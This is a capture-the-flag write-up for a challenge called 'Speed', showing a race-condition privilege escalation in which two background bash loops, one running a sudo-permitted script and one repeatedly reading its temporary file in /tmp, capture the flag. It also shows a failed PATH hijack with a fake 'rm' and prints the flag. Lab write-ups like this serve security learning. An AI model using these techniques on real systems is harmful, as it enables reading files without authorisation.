# Speed

## Write-Up

### Exploration

When acessing the challenge, we get a shell in the root `/` folder, when we find a `challenge/` folder that contains our `flag.txt` which we can't directly read with our user rights :

```
ctf@speed-74bbd6d8d9-6724k:/$ cd challenge
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls
crontab  flag.txt  read.py  sshd_config  sudoers
ctf@speed-74bbd6d8d9-6724k:/challenge$ cat flag.txt
cat: flag.txt: Permission denied
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l
total 20
-rw-rw-r-- 1 root root         466 Dec 20 18:44 crontab
-r--r----- 1 root ctf-cracked   57 Dec 20 18:44 flag.txt
-r-xr-xr-- 1 root ctf-cracked  223 Dec 20 18:44 read.py
-rw-rw-r-- 1 root root        3293 Dec 20 18:44 sshd_config
-rw-rw-r-- 1 root root         682 Dec 20 18:44 sudoers
```

For the other files, here is what each one represents : 

 - **`crontab` :** a file that contains current cron jobs in this machines :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ cat crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
* * * * * root  rm -rf /tmp/*
*/30 * * * * root       killall -u ctf && killall -u ctf-cracked
```

They can be seen also in the `/etc/crontab` file


```
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l /etc/crontab 
-rw-r--r-- 1 root root 1130 Dec 23 21:33 /etc/crontab
ctf@speed-74bbd6d8d9-6724k:/challenge$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root  rm -rf /tmp/*
*/30 * * * * root       killall -u ctf && killall -u ctf-cracked
```

**Note :** * = always. It is a wildcard for every part of the cron schedule expression. So * * * * * means every minute of every hour of every day of every month and every day of the week.

We can check the behaviour of the cron job as following :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l /tmp
total 0
ctf@speed-74bbd6d8d9-6724k:/challenge$ touch /tmp/script
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l /tmp
total 0
-rw-r--r-- 1 ctf ctf 0 Dec 26 02:55 script
```

After few seconds :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l /tmp
total 0
```

 - **`read.py` :** a python file that contains a script in which the `flag.txt` file is being read, written in a temporary file in the `/tmp` folder, which is then deleted directly at then end of the execution :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ cat read.py 
#!/usr/bin/python3

import os

FILE_NAME = "/tmp/A_flag_that_you_can't_catch"
FLAG = "/challenge/flag.txt"

with open(FLAG) as f :
    flag = f.read()

with open(FILE_NAME,"w") as f:
    f.write(flag)

os.remove(FILE_NAME)
```

Here is the output of its execution (we can see that it prints nothing) :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ sudo -u ctf-cracked ./read.py 
ctf@speed-74bbd6d8d9-6724k:/challenge$ 
```

 - **`sudoers` :**  a file that contain sudo rights for the users of this machine :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ cat sudoers 
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL


# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ctf    ALL=(ctf-cracked:ctf-cracked) /challenge/read.py
```

It contains same result of the `sudo -l` command which gives us the sudo rights of our user **(Necessary to check in each priv-esc challenge)** :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ sudo -l
[sudo] password for ctf: 
Matching Defaults entries for ctf on speed-74bbd6d8d9-6724k:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf may run the following commands on speed-74bbd6d8d9-6724k:
    (ctf-cracked : ctf-cracked) /challenge/read.py
```

### Attemps

One of the attempt we can do to gain some previlidges is to do some **Path manipulation**. Indeed, we can find the the path variable can be eddited, so used to overwrite some commands and scripts :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ export PATH=/tmp:$PATH
ctf@speed-74bbd6d8d9-6724k:/challenge$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

But, when trying to exploit it by, for example, overwrite the `rm` command, this doesn't work. We can see that the cron jobs still deletes files from `/tmp` :


```
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l /tmp
total 0
ctf@speed-74bbd6d8d9-6724k:/$ cd /tmp; echo "cat /tmp/A_flag_that_you_can't_catch" > rm; chmod 777 rm; export PATH=/tmp:$PATH;cd /
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l /tmp
total 0
-rwxrwxrwx 1 ctf ctf 0 Dec 26 02:55 rm
```

After few seconds :

```
ctf@speed-74bbd6d8d9-6724k:/challenge$ ls -l /tmp
total 0
```

### Solution


When checking also the tag, we can **Race Condition** : The Race condition is a privilege escalation vulnerability that manipulates the time between imposing a security control and using services in a UNIX-like system. This vulnerability is a result of interferences caused by multiple sequential threads running in the system and sharing the same resources. A race condition could occur due to sequence conditions imposed by un-trusted processes or locking failure conditions imposed by secure programs such as operating systems. The race condition is a common vulnerability in UNIX-like systems, where directories such as /tmp and /var/tmp are shared between threads.

So our idea is to make the `read.py` and, not the cron job, but a script that we make, for example to read the flag, race on accessing the flag located in the `/tmp`, and for that we need to keep executing the `read.py` as well as the reading script, simultaneously, until it happens then we get the flag.

1. For our reading script, we will try to run in a loop, in the background to create the simultanity effect, a `cat` command on the `/tmp` flag :

```
#!/bin/bash
old="1"

while [ "$old" == "$old" ]  
do
   cat /tmp/"A_flag_that_you_can't_catch" 2> /dev/shm/err &
done
```

Then we write it in a file and execute it **(Note that it is in a different path then `/tmp` folder to prevent the script removal)** :

```
ctf@speed-74bbd6d8d9-6724k:/$ tee > /dev/shm/script_cat
#!/bin/bash
old="1"

while [ "$old" == "$old" ]  
do
   cat /tmp/"A_flag_that_you_can't_catch" 2> /dev/shm/err &
done
^C
```

Give it right permissions

```
ctf@speed-74bbd6d8d9-6724k:/$ chmod 777 /dev/shm/script_cat
```

Then execute it (Note the use of `bash` before the script path since for some reason `/dev/shm` doesnt allow executing scripts in this container), always in the background using `Ampersand (&)` :

```
ctf@speed-74bbd6d8d9-6724k:/$ bash /dev/shm/script_cat &
```

Note that we use an error file to store the errors from the `cat` command and avoid overwhelming our terminal :

```
ctf@speed-74bbd6d8d9-6724k:/$ touch /dev/shm/err
ctf@speed-74bbd6d8d9-6724k:/$ chmod 777 /dev/shm/err
```

2. Next, here is some script to loop on the execution of the `read.py` file :

```
#!/bin/bash
CHECK_FILE="ls -l /tmp"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]  
do
   sudo -u ctf-cracked /challenge/read.py
   new=$($CHECK_FILE)
done
echo "STOP... The /tmp folder has been changed"
```

Then we write it in a file and execute it **(Note that it is in a different path then `/tmp` folder to prevent the script removal)** :

```
ctf@speed-74bbd6d8d9-6724k:/$ tee > /dev/shm/script_read
#!/bin/bash
CHECK_FILE="ls -l /tmp"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]  
do
   sudo -u ctf-cracked /challenge/read.py
   new=$($CHECK_FILE)
done
echo "STOP... The /tmp folder has been changed"
^C
```

Give it right permissions

```
ctf@speed-74bbd6d8d9-6724k:/$ chmod 777 /dev/shm/script_read
```

Then execute it (Note the use of `bash` before the script path since for some reason `/dev/shm` doesnt allow executing scripts in this container), always in the background using `Ampersand (&)`  :

```
ctf@speed-74bbd6d8d9-6724k:/$ bash /dev/shm/script_read &
```


### Execution

Here is how an execution scenario looks like :


```
ctf@speed-74bbd6d8d9-6724k:/$ touch /dev/shm/err
ctf@speed-74bbd6d8d9-6724k:/$ chmod 777 /dev/shm/err
ctf@speed-74bbd6d8d9-6724k:/$ ls -l /dev/shm
total 16
-rwxrwxrwx 1 ctf ctf  0 Dec 26 18:18 err
ctf@speed-74bbd6d8d9-6724k:/$ tee > /dev/shm/script_cat
#!/bin/bash
old="1"

while [ "$old" == "$old" ]  
do
   cat /tmp/"A_flag_that_you_can't_catch" 2> /dev/shm/err &
done
^C
ctf@speed-74bbd6d8d9-6724k:/$ chmod 777 /dev/shm/script_cat
ctf@speed-74bbd6d8d9-6724k:/$ tee > /dev/shm/script_read
#!/bin/bash
CHECK_FILE="ls -l /tmp"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]  
do
   sudo -u ctf-cracked /challenge/read.py
   new=$($CHECK_FILE)
done
echo "STOP... The /tmp folder has been changed"
^C
ctf@speed-74bbd6d8d9-6724k:/$ chmod 777 /dev/shm/script_read 
ctf@speed-74bbd6d8d9-6724k:/$ bash /dev/shm/script_cat &
[1] 136470
ctf@speed-74bbd6d8d9-6724k:/$ bash /dev/shm/script_read &
[2] 136637
ctf@speed-74bbd6d8d9-6724k:/$ ps -aef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 Dec23 ?        00:00:00 /bin/sh -c service cron start .    && service rsyslog start .    && service ssh start .    && tail -f --retry /var/log/auth.log
root          13       1  0 Dec23 ?        00:00:02 /usr/sbin/cron
root          22       1  0 Dec23 ?        00:00:07 /usr/sbin/rsyslogd
root          39       1  0 Dec23 ?        00:00:08 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          40       1  0 Dec23 ?        00:00:15 tail -f --retry /var/log/auth.log
root      130360      39  0 18:13 ?        00:00:00 sshd: ctf [priv]
ctf       130366  130360  0 18:13 ?        00:00:00 sshd: ctf@pts/0
ctf       130367  130366  0 18:13 pts/0    00:00:00 -bash
ctf       136470  130367  0 18:21 pts/0    00:00:00 bash /dev/shm/script_cat
ctf       136637  130367  0 18:21 pts/0    00:00:00 bash /dev/shm/script_read
root      136740  136637  0 18:22 pts/0    00:00:00 sudo -u ctf-cracked /challenge/read.py
ctf-cra+  136745  136740  0 18:22 pts/0    00:00:00 /usr/bin/python3 /challenge/read.py
ctf       136748  130367  0 18:22 pts/0    00:00:00 ps -aef
ctf@speed-74bbd6d8d9-6724k:/$ shellmates{83C4r3FU11WH3NY0UD341W17H71M317C4N76377r1CKY}
^C
ctf@speed-74bbd6d8d9-6724k:/$ shellmates{83C4r3FU11WH3NY0UD341W17H71M317C4N76377r1CKY}
^C
ctf@speed-74bbd6d8d9-6724k:/$ shellmates{83C4r3FU11WH3NY0UD341W17H71M317C4N76377r1CKY}
^C
ctf@speed-74bbd6d8d9-6724k:/$ shellmates{83C4r3FU11WH3NY0UD341W17H71M317C4N76377r1CKY}
^C
ctf@speed-74bbd6d8d9-6724k:/$ shellmates{83C4r3FU11WH3NY0UD341W17H71M317C4N76377r1CKY}
...
```

Of course, after getting the flag, don't forget to kill the processes and delete the files :

```
ctf@speed-74bbd6d8d9-6724k:/$ fg
bash /dev/shm/script_read
^C
ctf@speed-74bbd6d8d9-6724k:/$ fg
bash /dev/shm/script_cat
^C
```

```
ctf@speed-74bbd6d8d9-6724k:/$ ls -l /dev/shm
total 24
-rwxrwxrwx 1 ctf ctf  67 Dec 26 18:27 err
-rwxrwxrwx 1 ctf ctf 119 Dec 26 18:26 script_cat
-rwxrwxrwx 1 ctf ctf 224 Dec 26 18:21 script_read
ctf@speed-74bbd6d8d9-6724k:/$ rm /dev/shm/err
ctf@speed-74bbd6d8d9-6724k:/$ rm /dev/shm/script_cat 
ctf@speed-74bbd6d8d9-6724k:/$ rm /dev/shm/script_read 
ctf@speed-74bbd6d8d9-6724k:/$ ls -l /dev/shm
total 0
ctf@speed-74bbd6d8d9-6724k:/$ exit
logout
Connection to linux.challs.ctf.shellmates.club closed.
```

## Flag

shellmates{83C4r3FU11WH3NY0UD341W17H71M317C4N76377r1CKY}

(Because when you deal with time it can be tricky)


## More Information

Race condition explanation :
 - https://hackmd.io/@bachtam2001/BkZkudoLq
 - https://www.baeldung.com/cs/race-conditions
 - https://book.hacktricks.xyz/pentesting-web/race-condition

read files with `'` in their name : https://superuser.com/questions/606874/cannot-cat-file-which-has-space-in-name-in-linux

Launch scripts in background : https://www.makeuseof.com/run-linux-commands-in-background/